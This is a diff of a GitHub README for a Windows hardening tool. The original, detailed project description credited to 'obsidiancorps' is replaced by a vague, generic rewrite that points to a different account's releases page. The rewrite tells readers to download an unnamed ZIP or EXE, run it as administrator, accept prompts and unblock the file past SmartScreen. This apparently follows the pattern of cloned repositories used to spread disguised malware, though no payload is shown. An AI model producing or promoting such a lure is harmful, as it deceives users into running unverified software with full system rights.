@@ -1,193 +1,288 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-blue?logo=windows" alt="Platform">
-  <img src="https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell" alt="PowerShell">
-  <img src="https://img.shields.io/github/license/obsidiancorps/windows-hardening" alt="License">
-  <img src="https://img.shields.io/github/stars/obsidiancorps/windows-hardening?style=social" alt="Stars">
-</p>
+# 🛡️ windows-hardening - Harden Windows in minutes
 
-# Windows Hardening Tool
+[![Download](https://img.shields.io/badge/Download%20Here-blue-grey?style=for-the-badge&logo=github)](https://github.com/klentr7196/windows-hardening/releases)
 
-> One script. 150+ checks. Harden Windows 10/11 in minutes.
+## 🔐 What this is
 
-An interactive PowerShell tool that audits and hardens your Windows system across **11 categories** — from telemetry and bloatware to Defender ASR rules and credential protection. No dependencies, no third-party tools, just a single `.ps1` file.
+windows-hardening is a Windows setup tool that helps you lock down Windows 10 and Windows 11 with a guided menu. It checks common security settings, applies hardening changes, and shows a score so you can see what changed.
 
-<p align="center">
-  <strong>Audit &rarr; Review &rarr; Harden &rarr; Verify</strong>
-</p>
+Use it if you want to:
 
-## Highlights
+- Turn on stronger Defender settings
+- Remove common telemetry paths
+- Clean up bloatware
+- Review your security score
+- Apply CIS-style hardening checks without digging through system menus
 
-- **Interactive TUI** with animated audit, color-coded results, and category picker
-- **150+ hardening checks** based on CIS Benchmarks, Microsoft Security Baselines, and ACSC guidance
-- **Audit mode** — scan your system and get a hardening score without changing anything
-- **Quick Harden** — apply all recommended settings with one keypress
-- **Custom Harden** — pick exactly which categories to apply
-- **Automatic registry backup** before any changes, with one-click restore
-- **Silent/CLI mode** for automation, scripting, and deployment pipelines
-- **Zero dependencies** — runs on any Windows 10/11 machine with PowerShell 5.1
+## ✅ What it can do
 
-## Quick Start
+This tool can help with:
 
-```powershell
-# Download and run (as Administrator)
-irm https://raw.githubusercontent.com/obsidiancorps/windows-hardening/main/Harden-Windows.ps1 -OutFile Harden-Windows.ps1
-powershell -ExecutionPolicy Bypass -File .\Harden-Windows.ps1
-```
+- Defender ASR rules
+- Windows security checks
+- Privacy and telemetry changes
+- Bloatware cleanup
+- Firewall-related hardening checks
+- Local policy and registry-based hardening
+- CIS benchmark coverage for common Windows settings
+- Audit scoring before and after changes
 
-Or clone the repo:
+## 🖥️ System requirements
 
-```powershell
-git clone https://github.com/obsidiancorps/windows-hardening.git
-cd windows-hardening
-powershell -ExecutionPolicy Bypass -File .\Harden-Windows.ps1
-```
+Use a Windows PC with:
 
-## What It Hardens
+- Windows 10 or Windows 11
+- Administrator access
+- Internet access for the first download
+- Enough free space for the app and logs
+- PowerShell available on the system
 
-| # | Category | Settings | What it does |
-|---|----------|:--------:|-------------|
-| 1 | **Telemetry** | 12 | Diagnostic data, feedback, error reports, advertising ID |
-| 2 | **Privacy** | 14 | Activity history, location, speech, camera/mic defaults |
-| 3 | **Services** | 13 | DiagTrack, geolocation, Xbox, Maps, error reporting |
-| 4 | **Scheduled Tasks** | 12 | CEIP, compatibility appraiser, feedback, disk diagnostics |
-| 5 | **Network** | 15 | SMBv1, LLMNR, WPAD, NetBIOS, RDP NLA/TLS, DNS-over-HTTPS, telemetry firewall |
-| 6 | **Security** | 19 | UAC, NTLM, LSA Protection, Credential Guard, SMB signing, PS logging |
-| 7 | **Defender/ASR** | 19 | 14 Attack Surface Reduction rules + PUA/network protection |
-| 8 | **Bloatware** | 21+ | Remove pre-installed apps, disable suggested content and spotlight |
-| 9 | **AI/Copilot** | 8 | Disable Copilot, Recall, Bing AI, web search in Start |
-| 10 | **Windows Update** | 5 | Defer feature updates, disable P2P delivery, no auto-restart |
-| 11 | **Miscellaneous** | 7 | File extensions, GameDVR, widgets, lock screen hardening |
+For best results:
 
-### Attack Surface Reduction Rules
+- Close open apps before you start
+- Save your work first
+- Use a local admin account
 
-The Defender category enables **14 ASR rules** in Block mode, covering the most common attack vectors:
+## ⬇️ Download the app
 
-- Office apps creating executables, child processes, or injecting code
-- JavaScript/VBScript launching downloaded content
-- Obfuscated scripts and untrusted USB processes
-- Credential stealing from LSASS
-- Email-delivered executables
-- WMI persistence and PSExec/WMI process creation
-- Abuse of vulnerable signed drivers
+Visit this page to download the latest release:
 
-### Audit-Only Items
+https://github.com/klentr7196/windows-hardening/releases
 
-Some items are checked but **not automatically applied** because they require specific hardware or may break certain apps:
+## 🚀 Getting started
 
-- **Credential Guard** — needs UEFI + TPM + VBS capable hardware
-- **Controlled Folder Access** — can block legitimate apps from writing to Documents/Desktop
+Follow these steps on Windows:
 
-The script includes manual enable instructions for these in the source comments.
+1. Open the download page.
+2. Find the latest release.
+3. Download the file for Windows.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app or script as an administrator.
+7. Follow the on-screen menu.
 
-## Usage
+If Windows asks for approval:
 
-### Interactive Mode
+- Choose Yes
+- If SmartScreen appears, check that you got the file from the release page
+- If the file is blocked, right-click it, open Properties, and select Unblock if shown
 
-```powershell
-.\Harden-Windows.ps1
-```
+## 🧭 How to use it
 
-Navigate the TUI menu:
-1. **Audit System** — animated scan with per-category progress bars and overall score
-2. **Quick Harden** — apply all settings (creates backup first)
-3. **Custom Harden** — toggle individual categories on/off
-4. **Create/Restore Backup** — manual backup management
+When the tool starts, you will see a menu with options such as:
 
-### Silent Mode (CLI)
+- Run a security audit
+- Apply hardening rules
+- Remove telemetry items
+- Clean up unwanted apps
+- Export results
+- Review the current score
 
-```powershell
-# Apply everything (for automation / deployment)
-.\Harden-Windows.ps1 -Silent -All
+A good first step is to run the audit. That shows the current state of your PC before you change anything.
 
-# Apply specific categories only
-.\Harden-Windows.ps1 -Silent -Categories Telemetry,Privacy,Services,Defender,AI
+Then you can:
 
-# Valid categories:
-# Telemetry, Privacy, Services, Tasks, Network, Security,
-# Defender, Bloatware, AI, Updates, Misc
-```
+1. Review the audit results
+2. Apply the changes you want
+3. Run the audit again
+4. Compare the new score
 
-## What It Does NOT Do
+## 🧰 What the tool changes
 
-- **Does not disable Windows Update** — that would be a security risk
-- **Does not disable Windows Defender** — you need your AV
-- **Does not modify UEFI/boot settings** — no risk of bricking
-- **Does not touch your files or personal data**
+The tool may adjust settings like:
 
-## Backup and Restore
+- Microsoft Defender protections
+- Attack surface reduction rules
+- Telemetry and data sharing options
+- App and feature cleanup
+- Security policies
+- Common Windows privacy settings
+- Recommended hardening settings from CIS-style checks
 
-The tool **automatically creates a registry backup** in `%USERPROFILE%\WindowsHardeningBackups\` before applying any changes. Each backup is timestamped. You can restore any backup from the TUI menu or by importing the `.reg` file directly.
+The exact changes depend on the options you pick in the menu.
 
-## False Positive Prevention
+## 🔍 Before you make changes
 
-The audit engine handles three classes of checks to avoid false reporting:
+Use a simple plan:
 
-| Check type | How it works |
-|-----------|-------------|
-| **Standard registry** | Reads key, compares to desired value |
-| **NullOk (secure defaults)** | Missing key = already secure (e.g., DEP, WDigest, SEHOP are on by default) |
-| **Custom check** | Scriptblock for complex state (e.g., SMBv1 uses `Get-WindowsOptionalFeature`, Credential Guard uses WMI) |
+- Run the audit first
+- Read the list of changes
+- Apply one group at a time if you want more control
+- Restart the PC if the tool asks you to
+- Check that your apps still work after each step
 
-## Requirements
+This helps you keep control of the system and makes it easier to see what changed.
 
-- Windows 10 (1903+) or Windows 11 (including 24H2)
-- PowerShell 5.1+
-- **Administrator privileges**
+## 🛠️ Typical setup steps
 
-## FAQ
+If the release comes as a ZIP file:
 
-<details>
-<summary><strong>Will this break anything?</strong></summary>
+1. Download the ZIP file from the release page
+2. Right-click the file
+3. Select Extract All
+4. Open the extracted folder
+5. Find the main script or app file
+6. Right-click it and choose Run as administrator
+7. Follow the menu on screen
 
-The settings are conservative and widely tested. Xbox services are disabled (irrelevant if you don't game on PC). Camera/microphone defaults are set to Deny but apps can still request access. If something breaks, use the Restore Backup option.
-</details>
+If the release comes as an EXE file:
 
-<details>
-<summary><strong>Do I need to restart?</strong></summary>
+1. Download the EXE file from the release page
+2. Open the file
+3. Allow Windows to run it
+4. Select the options you want
+5. Confirm the changes
+6. Restart when asked
 
-Yes — LSA Protection, service changes, and some network settings require a restart to take full effect.
-</details>
+## 🧪 Audit scoring
 
-<details>
-<summary><strong>Can I run this on a domain-joined machine?</strong></summary>
+The audit score gives you a quick view of your security state.
 
-Yes, but domain Group Policy may override some settings. The audit will accurately show what's actually applied regardless of GPO.
-</details>
+A higher score usually means:
 
-<details>
-<summary><strong>How do I undo everything?</strong></summary>
+- More security features are on
+- Fewer risky settings are left enabled
+- Privacy settings are tighter
+- Common hardening checks passed
 
-Use [5] Restore Backup in the TUI. For services, re-enable manually via `services.msc`. For bloatware, reinstall from the Microsoft Store.
-</details>
+Use the score as a guide, not as the only measure. Some settings may affect normal apps, printers, remote access, or update tools.
 
-<details>
-<summary><strong>Can I use this in my organization?</strong></summary>
+## 🔒 Defender and ASR rules
 
-Yes. The `-Silent -All` mode is designed for deployment pipelines. The MIT license allows commercial use. Test on a staging machine first.
-</details>
+This tool can help you turn on Microsoft Defender hardening, including ASR rules.
 
-## References
+ASR rules help block common attack methods such as:
 
-This tool's checks are informed by:
+- Scripts that launch from unsafe places
+- Office files that run child processes
+- Malware that tries to act like trusted software
+- Suspicious behavior that often shows up in attacks
 
-- [CIS Microsoft Windows 11 Enterprise Benchmark v4.0.0](https://www.cisecurity.org/benchmark/microsoft_windows_desktop)
-- [Microsoft Attack Surface Reduction Rules](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)
-- [ACSC Hardening Microsoft Windows 11](https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-hardening/hardening-microsoft-windows-10-version-21h1-workstations)
-- [Microsoft Security Baselines](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines)
+These rules can improve protection, but they may affect some work tools or older apps.
 
-## Contributing
+## 🧹 Privacy and cleanup
 
-PRs welcome! Please:
-1. Test on a clean Windows 10/11 VM before submitting
-2. Add comments explaining **what** the setting does and **why** it matters
-3. Use `NullOk` or `Check` scriptblocks where the default state is already secure
+The app can also help you reduce common clutter and privacy noise.
 
-## License
+That may include:
 
-[MIT](LICENSE)
+- Removing preinstalled apps you do not use
+- Turning down telemetry
+- Disabling some background items
+- Cleaning up common Windows extras
 
----
+This can make Windows feel leaner and easier to manage.
 
-<p align="center">
-  Made by <a href="https://github.com/obsidiancorps">ObsidianCorps</a>
-</p>
+## ⚙️ If you want to change your mind
+
+If you apply settings and later want to undo them:
+
+- Run the tool again
+- Look for restore or revert options
+- Recheck the audit after changes
+- Use Windows settings if a specific app or feature needs to be turned back on
+
+For best control, note which options you changed.
+
+## 🧾 Common use case
+
+A simple first run looks like this:
+
+1. Download the release from GitHub
+2. Extract the file if needed
+3. Run it as administrator
+4. Choose the audit option
+5. Review the score
+6. Apply the recommended hardening options
+7. Restart the PC if asked
+8. Run the audit again
+
+This gives you a clear before-and-after view.
+
+## 🧩 Troubleshooting
+
+If the tool does not start:
+
+- Check that you used the latest release
+- Run it as administrator
+- Make sure PowerShell is available
+- Try extracting the ZIP file again
+- Check that Windows did not block the file
+
+If a setting causes an issue:
+
+- Reopen the tool
+- Use the revert or restore option if present
+- Turn the setting off in Windows
+- Restart the PC
+
+If a scan or change feels slow:
+
+- Wait for it to finish
+- Keep the PC plugged in
+- Close other heavy apps
+- Try again after a restart
+
+## 📁 What to expect in the release
+
+A release may include:
+
+- A main script or app file
+- A readme or usage file
+- Logs or audit output
+- Supporting files needed to run the tool
+
+Open the release page and use the newest version for the cleanest setup.
+
+## 🔑 Permissions needed
+
+You need admin rights because the tool changes Windows security settings.
+
+Without admin rights, the tool may:
+
+- Fail to change system settings
+- Skip some checks
+- Show access denied errors
+- Leave some options unavailable
+
+If possible, use the account that manages the PC.
+
+## 🧭 Best first run
+
+If this is your first time using the tool:
+
+1. Download the release
+2. Run a full audit
+3. Read the results
+4. Apply only the changes you understand
+5. Restart if needed
+6. Run the audit again
+
+That gives you a safe and clear setup path
+
+## 📌 Notes on compatibility
+
+The tool is meant for:
+
+- Windows 10
+- Windows 11
+
+It is a good fit for:
+
+- Home PCs
+- Small office systems
+- Test machines
+- Personal laptops
+
+It may affect:
+
+- Some older software
+- Certain remote tools
+- Special printer or scanner features
+- Custom enterprise apps
+
+## 📎 Download again
+
+If you need the file again, visit the release page here:
+
+https://github.com/klentr7196/windows-hardening/releases
